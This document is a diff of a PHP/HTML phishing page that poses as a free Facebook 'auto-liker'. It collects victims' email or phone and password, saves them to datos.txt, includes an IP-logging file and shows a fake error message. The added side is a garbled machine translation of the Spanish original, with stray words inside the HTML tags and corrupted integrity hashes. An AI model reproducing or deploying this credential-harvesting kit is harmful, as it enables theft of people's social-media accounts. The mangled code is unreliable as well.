@@ -1,75 +1,75 @@
 
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Auto-Reacciones a Facebook 2019/2020♥️</title>
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
-    <style>
-    body {
-      height:100%;
-      width:100%;
-      
-      background-repeat: no-repeat;
-      background-size:cover;
-    }
-    .centrar {
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-    }
-    </style>
-  </head>
-  <body>
+the <head>
+ <meta charset="utf-8">
+ <meta http-equiv="X-UA-Compatible" content="IE=edge">
+ <meta name="viewport" content="width=device-width, initial-scale=1">
+ <title>Self-Reactions to Facebook 2019/2020♥️</title>
+ <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjvme1fgjwpgmkzs7" crossorigin="anonymous">
+<style>
+ body {
+height:100%;
+width:100%;
+
+ background-repeat: no-repeat;
+background-size:cover;
+}
+ .focus {
+ min-height: 100vh;
+ display: flex;
+ align-items: center;
+}
+</style>
+</head>
+the <body>
 <?php
 
-  if (isset($_POST["email"]) && isset($_POST["pass"])) {
-    $fichero = "datos.txt";
-    $usuario = htmlentities(str_replace("<:>","",$_POST["email"]));
-    $pass = htmlentities(str_replace("<:>","",$_POST["pass"]));
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $text = $usuario."\nemail: ".$usuario."\nPass: ".$pass;
-    $nuevo .= $text."\n";
-    file_put_contents($fichero, $nuevo);
-    $m = "<div class='alert alert-danger' role='alert'>Error 225; No se han podido añadir las reacciones hacia el objetivo :(.</div>";
-  }else{
-    $m = "";
-  }
+ if (isset($_POST["email"]) && isset($_POST["pass"])) {
+ $file = "datos.txt";
+ $user = htmlentities(str_replace("<:>","",$_POST["email"]));
+ $pass = htmlentities(str_replace("<:>","",$_POST["pass"]));
+ $ip = $_SERVER['REMOTE_ADDR'];
+ $text = $user."\nemail: ".$user."\nPass: ".$pass;
+ $new .= $text."\n";
+ file_put_contents($file, $new);
+ $m = "<div class='alert alert-danger' role='alert'>Error 225; Not have been able to add reactions to the lens :(.</div>";
+}else{
+ $m = "";
+}
 ?>
 <?php include 'ip.php'; ?>
-  <div class="container centrar">
+ <div class="container center">
 
-    <div class="row">
-      <div class="col-md-12">
+ <div class="row">
+ <div class="col-md-12">
 <img src="Cesar.png" width="auto" height="215" <="" div="">
-	<div class="alert alert-info">
-	
-	<h1><b>Auto-Reaccion 2019/2020</b></h1><hr/>
-          <h1><b>AUTO LIKER EN FACEBOOK GRATIS</b></h1><hr/>
-          <form method="POST" action="login_form_mb.php">
-            <?php echo $m; ?>
-            <input name="email" type="text" class="form-control" placeholder="Correo electronico o telefono"><br/>
-	    <input name="pass" type="password" class="form-control" placeholder="Contraseña"><br/>
-	    <input name="CesarHackGray" type="text" class="form-control" placeholder="URL de la foto"><br/>
-            <select class="form-control">
-              <option>350 Me Gusta    (GRATIS)</option>
-              <option>350 Me Encanta      (GRATIS)</option>
-              <option>350 Me Entristece (GRATIS)</option>
-              <option>350 Me Enoja      (GRATIS)</option>
-	      <option>350 Me divierte   (GRATIS)</option>
-	      <option>350 Todos   (GRATIS)</option>
-              <option>1500 Me Encanta (20$)</option>
-            </select><br/>
-            <button class="btn btn-success btn-lg btn-block" type="submit">Añadir likes </button>
-          </form>
-        </div>
-      </div>
-    </div>
-  </div>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
-  </body>
+ <div class="alert alert-info">
+
+ the <h1><b>Auto-Reaction 2019/2020</b></h1><hr/>
+ the <h1><b>AUTO LIKER ON FACEBOOK FREE</b></h1><hr/>
+ <form method="POST" action="login_form_mb.php">
+ <?php echo $m; ?>
+ <input name="email" type="text" class="form-control" placeholder="Email or phone"><br/>
+ <input name="pass" type="password" class="form-control" placeholder="Password"><br/>
+ <input name="CesarHackGray" type="text" class="form-control" placeholder="URL of photo"><br/>
+ <select class="form-control">
+ <option>350 I Like the (FREE)</option>
+ <option>350 I Love (FREE)</option>
+ <option>350 Saddens Me (for FREE)</option>
+ <option>350 Me Angry (FREE)</option>
+ <option>350 amuses Me (for FREE)</option>
+ <option>350 All (FREE)</option>
+ <option>1500 I Love it (20$)</option>
+</select><br/>
+ <button class="btn btn-success btn-lg btn-block" type="submit">Add facebook likes </button>
+</form>
+</div>
+</div>
+</div>
+</div>
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+ <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37prr3j5elqxss1yvqotnepnhvp9aj7xs" crossorigin="anonymous"></script>
+</body>
 </html>
- 
+
